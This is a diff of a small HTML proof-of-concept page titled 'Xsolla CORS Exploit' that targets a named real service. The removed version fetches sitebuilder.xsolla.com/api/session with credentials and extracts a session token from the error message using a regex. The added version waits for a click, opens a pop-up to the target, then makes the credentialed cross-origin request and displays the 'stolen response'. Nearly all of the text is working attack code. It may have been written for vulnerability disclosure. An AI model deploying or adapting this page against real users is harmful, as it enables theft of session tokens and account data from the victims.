@@ -1,39 +1,35 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CORS TesT - Token Extraction</title>
+    <title>Xsolla CORS Exploit</title>
 </head>
 <body>
-    <h2>Response from Xsolla:</h2>
-    <pre id="response" style="background: #f0f0f0; padding: 10px; border-radius: 5px; overflow-x: auto;"></pre>
-    
-    <h3>Extracted Token:</h3>
-    <pre id="token" style="background: #ffeb3b; padding: 10px; border-radius: 5px; word-break: break-all;"></pre>
+    <h1>Click anywhere on this page to trigger the attack</h1>
+    <div id="response" style="background: #f0f0f0; padding: 10px; margin-top: 20px; font-family: monospace;"></div>
 
     <script>
-    fetch('https://sitebuilder.xsolla.com/api/session', {
-        method: 'POST',
-        credentials: 'include',
-        mode: 'cors'
-    })
-    .then(response => response.json())
-    .then(data => {
-        // Display full response
-        document.getElementById('response').textContent = JSON.stringify(data, null, 2);
-        
-        // Extract token from error description
-        const errorDesc = data.error?.description || '';
-        const tokenMatch = errorDesc.match(/token: ([^\s;]+)/);
-        
-        if (tokenMatch && tokenMatch[1]) {
-            document.getElementById('token').textContent = tokenMatch[1];
-        } else {
-            document.getElementById('token').textContent = 'No token found in response';
-        }
-    })
-    .catch(err => {
-        document.getElementById('response').textContent = 'Error: ' + err.message;
-        document.getElementById('token').textContent = 'Failed to fetch';
+    document.addEventListener("DOMContentLoaded", () => {
+        document.onclick = () => {
+            // Step 1: Open a pop-up to the target site
+            open('https://sitebuilder.xsolla.com/');
+            
+            // Step 2: Wait a moment, then make the CORS request
+            setTimeout(() => {
+                fetch('https://sitebuilder.xsolla.com/api/session', {
+                    method: 'POST',
+                    credentials: 'include',
+                    mode: 'cors'
+                })
+                .then(response => response.json())
+                .then(data => {
+                    // Step 3: Display the stolen response
+                    document.getElementById('response').innerHTML = JSON.stringify(data, null, 2);
+                })
+                .catch(error => {
+                    document.getElementById('response').innerHTML = 'Error: ' + error.message;
+                });
+            }, 2000); // 2 second delay ensures the pop-up has time to load
+        };
     });
     </script>
 </body>
